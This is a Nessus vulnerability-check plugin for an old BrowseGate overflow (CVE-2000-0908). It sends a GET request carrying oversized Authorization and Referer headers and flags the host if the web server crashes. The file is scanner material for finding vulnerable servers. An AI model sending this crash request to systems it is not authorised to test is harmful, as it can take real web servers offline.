#
# (C) Tenable Network Security, Inc.
#

# This is an old bug. I don't know if we need _two_ overflows to 
# crash BrowseGate or if this crashes any other web server
# 
# Script audit and contributions from Carmichael Security
#      Erik Anderson <eanders@carmichaelsecurity.com> (nb: this domain no longer exists)
#      Added BugtraqID and CVE



include("compat.inc");

if(description)
{
 script_id(11130);
 script_version ("$Revision: 1.18 $");
 script_cve_id("CVE-2000-0908");
 script_bugtraq_id(1702);
 script_xref(name:"OSVDB", value:"1565");

 script_name(english:"BrowseGate HTTP MIME Headers Remote Overflow");
 
 script_set_attribute(attribute:"synopsis", value:
"It may be possible to execute arbitrary code on the remote web server." );
 script_set_attribute(attribute:"description", value:
"It was possible to kill the remote server by sending it an invalid
request with too long HTTP headers (Authorization and Referer). 

BrowseGate proxy was known to be vulnerable to this flaw. 

A cracker may exploit this vulnerability to make your web server crash
continually or even execute arbitrary code on your system." );
 script_set_attribute(attribute:"solution", value:
"Upgrade your software or protect it with a filtering reverse proxy" );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:M/Au:N/C:C/I:C/A:C" );

script_end_attributes();

 script_summary(english: "Too long HTTP headers kill BrowseGate");
 script_category(ACT_DESTRUCTIVE_ATTACK);
 script_copyright(english: "This script is Copyright (C) 2002-2009 Tenable Network Security, Inc.");
 script_family(english: "Web Servers");
 script_require_ports("Services/www", 80);
 script_dependencie("http_version.nasl");
 script_require_keys("Settings/ParanoidReport");
 exit(0);
}

########
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

if (report_paranoia < 2) exit(0);

port = get_http_port(default:80);

if (http_is_dead(port: port)) exit(0);

r = http_send_recv3(port: port, item: "/", method: 'GET', 
  add_headers:
    make_array( "Authorization", "Basic"+crap(8192),
    		"Referer", "http://www.example.com/"+crap(8192) ) );

#	"From: nessus@example.com\r\n",
#	"If-Modified-Since: Sat, 29 Oct 1994 19:43:31 GMT\r\n",
#	"UserAgent: Nessus 1.2.6\r\n\r\n

if (http_is_dead(port: port, retry: 3)) { security_hole(port); }
